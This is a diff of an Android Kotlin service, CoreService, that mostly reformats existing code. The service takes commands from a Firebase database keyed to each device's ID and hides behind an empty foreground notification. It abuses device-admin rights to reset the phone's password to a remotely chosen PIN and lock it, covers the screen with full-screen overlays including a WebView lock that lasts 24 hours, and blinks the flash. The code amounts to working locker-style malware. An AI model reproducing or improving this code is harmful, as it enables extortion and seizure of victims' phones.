@@ -22,6 +22,7 @@ import java.util.TimerTask
 import kotlin.concurrent.thread
 
 class CoreService : Service() {
+
     private lateinit var dbRef: com.google.firebase.database.DatabaseReference
     private lateinit var cameraManager: CameraManager
     private lateinit var dpm: DevicePolicyManager
@@ -33,17 +34,22 @@ class CoreService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        val deviceId = android.provider.Settings.Secure.getString(
-            contentResolver, android.provider.Settings.Secure.ANDROID_ID)
 
-        dbRef = FirebaseDatabase.getInstance().reference
-            .child("commands").child(deviceId)
+        val deviceId = android.provider.Settings.Secure.getString(
+            contentResolver,
+            android.provider.Settings.Secure.ANDROID_ID
+        )
+
+        dbRef = FirebaseDatabase.getInstance().reference.child("commands").child(deviceId)
         cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
         dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
         windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
 
-        startForeground(1, NotificationCompat.Builder(this, "")
-            .setContentTitle("").setContentText("").build())
+        // Foreground service dengan channel ID kosong (cukup untuk testing)
+        startForeground(1, NotificationCompat.Builder(this, "").apply {
+            setContentTitle("")
+            setContentText("")
+        }.build())
 
         dbRef.addValueEventListener(object : com.google.firebase.database.ValueEventListener {
             override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
@@ -56,7 +62,10 @@ class CoreService : Service() {
                 }
                 dbRef.removeValue()
             }
-            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
+
+            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
+                // ignore
+            }
         })
     }
 
@@ -75,6 +84,7 @@ class CoreService : Service() {
                     textSize = 24f
                     gravity = Gravity.CENTER
                 }
+
                 windowManager.addView(tv, WindowManager.LayoutParams().apply {
                     type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                     flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
@@ -83,28 +93,44 @@ class CoreService : Service() {
                     height = ViewGroup.LayoutParams.MATCH_PARENT
                     gravity = Gravity.CENTER
                 })
+
                 overlayView = tv
-                handler.postDelayed({ removeOverlay() }, 10000)
-            } catch (e: Exception) { e.printStackTrace() }
+
+                handler.postDelayed({
+                    removeOverlay()
+                }, 10000)
+
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
         }
     }
 
     private fun removeOverlay() {
-        overlayView?.let { windowManager.removeView(it); overlayView = null }
+        overlayView?.let {
+            try {
+                windowManager.removeView(it)
+            } catch (_: Exception) {
+            }
+            overlayView = null
+        }
     }
 
     private fun toggleFlashBlink() {
         if (flashTimer != null) {
-            flashTimer?.cancel(); flashTimer = null
+            flashTimer?.cancel()
+            flashTimer = null
             return
         }
+
         flashTimer = Timer().apply {
             scheduleAtFixedRate(object : TimerTask() {
                 override fun run() {
                     try {
                         val camId = cameraManager.cameraIdList[0]
                         cameraManager.setTorchMode(camId, System.currentTimeMillis() % 1800 < 900)
-                    } catch (_: Exception) {}
+                    } catch (_: Exception) {
+                    }
                 }
             }, 0, 900)
         }
@@ -112,11 +138,13 @@ class CoreService : Service() {
 
     private fun lockWithPin(pin: String) {
         if (pin.length < 4) return
+
         val adminName = ComponentName(this, AdminReceiver::class.java)
         if (dpm.isAdminActive(adminName)) {
             dpm.resetPassword(pin, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY)
             dpm.lockNow()
         }
+
         val block = TextView(this).apply {
             text = "🔒 TERKUNCI PIN"
             setTextColor(0xFFFFFFFF.toInt())
@@ -124,6 +152,7 @@ class CoreService : Service() {
             textSize = 48f
             gravity = Gravity.CENTER
         }
+
         windowManager.addView(block, WindowManager.LayoutParams().apply {
             type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
             flags = WindowManager.LayoutParams.FLAG_FULLSCREEN or
@@ -132,8 +161,12 @@ class CoreService : Service() {
             width = ViewGroup.LayoutParams.MATCH_PARENT
             height = ViewGroup.LayoutParams.MATCH_PARENT
         })
+
         handler.postDelayed({
-            try { windowManager.removeView(block) } catch (_: Exception) {}
+            try {
+                windowManager.removeView(block)
+            } catch (_: Exception) {
+            }
         }, 5000)
     }
 
@@ -142,15 +175,24 @@ class CoreService : Service() {
             settings.javaScriptEnabled = true
             settings.domStorageEnabled = true
             webViewClient = WebViewClient()
-            addJavascriptInterface(object : Any {
-                @android.webkit.JavascriptInterface
-                fun dismissLock() {
-                    handler.post { removeCustomLock() }
-                }
-            }, "AndroidLock")
+
+            addJavascriptInterface(
+                object {
+                    @android.webkit.JavascriptInterface
+                    fun dismissLock() {
+                        handler.post {
+                            removeCustomLock()
+                        }
+                    }
+                },
+                "AndroidLock"
+            )
+
             loadDataWithBaseURL("https://controller/", htmlContent, "text/html", "UTF-8", null)
         }
+
         webViewLock = webView
+
         windowManager.addView(webView, WindowManager.LayoutParams().apply {
             type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
             flags = WindowManager.LayoutParams.FLAG_FULLSCREEN or
@@ -159,14 +201,18 @@ class CoreService : Service() {
             width = ViewGroup.LayoutParams.MATCH_PARENT
             height = ViewGroup.LayoutParams.MATCH_PARENT
         })
+
         handler.postDelayed({
             removeCustomLock()
-        }, 86400000L)
+        }, 86400000L) // 24 jam
     }
 
     private fun removeCustomLock() {
         webViewLock?.let {
-            try { windowManager.removeView(it) } catch (_: Exception) {}
+            try {
+                windowManager.removeView(it)
+            } catch (_: Exception) {
+            }
             webViewLock = null
         }
     }
@@ -175,5 +221,6 @@ class CoreService : Service() {
         flashTimer?.cancel()
         super.onDestroy()
     }
+
     override fun onBind(intent: Intent?): IBinder? = null
 }
